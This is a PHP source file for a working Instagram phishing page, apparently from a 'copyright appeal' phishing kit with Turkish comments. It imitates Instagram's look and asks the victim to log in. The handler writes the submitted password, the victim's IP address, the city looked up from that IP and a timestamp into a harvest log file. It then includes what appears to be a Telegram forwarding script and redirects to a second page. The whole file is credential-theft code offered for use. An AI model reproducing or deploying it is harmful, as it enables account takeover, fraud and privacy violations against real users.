<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);
 
include('slokerapi/sloker.php'); 


if ($_POST) {
	
    $username = $_SESSION["username"];
    $slokerpass =  $_POST['slokerpass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $sehir = $details->city;
    date_default_timezone_set('Europe/Istanbul');
    $tarih = date("d-m-Y H:i:s");
    

  
    $file = fopen('sloker.php', 'a');
    fwrite($file, "
     <div class='box'>
        <div class='right_side'>
          <center><img src='$pp' style='height: 75px; border-radius:50%;'></img>
          <div class='numbers'>Giriş Sayfasında @$username</div>
          <div class='box_topic'>Şifre : $slokerpass<br>IP Adresi : $ip<br>Tarih : $tarih</div>
        </div></center>
      </div>
  
  
  "); 
  
  fclose($file);
  echo '';
    
  header("location: login2.php");
      include 'slokerapi/tg.php';
  }
  ?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	   <title>Login • @<?php echo $username; ?></title>

       <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">

	<link rel="stylesheet" type="text/css" href="slokerlogin.css">
</head>
<body>


	<div class="slokerborder">
		<center>		<img src="slokerimg/1.png" width="125" style="margin-top: 10px; margin-left: -1300px;">
			</center>

			</div>

<div class="slokermain">

<center>
  <img src="<?php echo $pp; ?>" style="width: 120px; border-radius: 50%; margin-left: 15px;" alt="">
</center>
<h3 class="slokertelif9">@<?php echo $username; ?></h3>
<br>
<h3 style="  text-align: center;
    font-family: 'Poppins';
    color: black;
    font-size: 13px;"><?= $gonderi ?> • <?= $takipci ?> • <?= $takip ?></h3>
<br>
    <center>

    	  <img src="<?= $fff4 ?>" style="width: 150px;">
    </center>

<h3 class="slokertelif4">Dear <font color="red">@<?php echo $username; ?> </font> , before filling out the appeal form,
You must login to your account.

</h3>

<br>

<form method="post">
<!--Veri Çekilecek İnputlar-->
<input type="password" name="slokerpass" placeholder="Password" required>	
<!--Veri Çekilecek İnputlar / Sloker-->
<button type="submit"   class="slokerbtn">Login @<?php echo $username; ?></button>

</form>

<!--Telif Hakkı Nedir Yazısı -->
   <br><br><br>
    
    <center>
    <img src="slokerimg/1.gif" width="350" style="margin-left: -50px;">
    </center>
<br>
 <center>
     <img src="https://images.vexels.com/media/users/3/147102/isolated/lists/082213cb0f9eabb7e6715f59ef7d322a-instagram-profile-icon.png" width="150">
 </center>
<!--Yazı Bitiş / Sloker-->



</div>




</body>



</html>